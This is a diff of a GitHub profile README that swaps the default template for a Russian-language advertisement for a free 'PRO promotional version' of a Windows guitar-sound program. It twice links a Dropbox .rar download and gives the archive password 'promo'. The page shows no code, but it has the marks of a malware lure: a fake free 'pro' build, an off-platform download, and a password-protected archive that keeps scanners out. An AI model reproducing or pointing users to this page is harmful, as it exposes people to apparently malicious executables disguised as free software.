@@ -1,16 +1,29 @@
-### Hi there 👋
+# Guitar Sound Maker ® [PRO promotional version]
+-------------
+![alt-текст](https://imgur.com/zSIAdCr)
+## Guitar Sound Maker ® [PRO]
+## Сборка гитарных звуков для создания композиций 
+### Профессиональная Бета-версия для промоушена
+### 💻 Only for Windows OS
+#### Требуемые для корректной работы характеристики:
+* Установленный Microsoft Visual C++
+* Microsoft .NET Framework
+* OS - Windows 7 or higher 
+* RAM - 4 GB or more
+* Disk space - 2 GB free space
 
-<!--
-**GuitarMusicMaker/GuitarMusicMaker** is a ✨ _special_ ✨ repository because its `README.md` (this file) appears on your GitHub profile.
+## 🔐 [Guitar Sound Maker [PRO] СКАЧАТЬ](https://www.dropbox.com/s/74er08916fgp6pg/musicmaker.rar?dl=1)
 
-Here are some ideas to get you started:
+![alt-текст](https://imgur.com/NhnYouJ)
 
-- 🔭 I’m currently working on ...
-- 🌱 I’m currently learning ...
-- 👯 I’m looking to collaborate on ...
-- 🤔 I’m looking for help with ...
-- 💬 Ask me about ...
-- 📫 How to reach me: ...
-- 😄 Pronouns: ...
-- ⚡ Fun fact: ...
--->
+## Описание данной версии приложения
+
+#### Расширенный стандартный функционал 
+
+* Цвета и стили гитар на выбор
+* Возможность подкрутки контраста звука
+* Создание песен без звукового логотипа приложения
+* Создание песен длинное до 24 минут
+
+## 🔐 [Guitar Sound Maker [PRO] СКАЧАТЬ](https://www.dropbox.com/s/74er08916fgp6pg/musicmaker.rar?dl=1)
+ПАРОЛЬ ДЛЯ ДАННОЙ ВЕРСИИ ПРИЛОЖЕНИЯ: promo
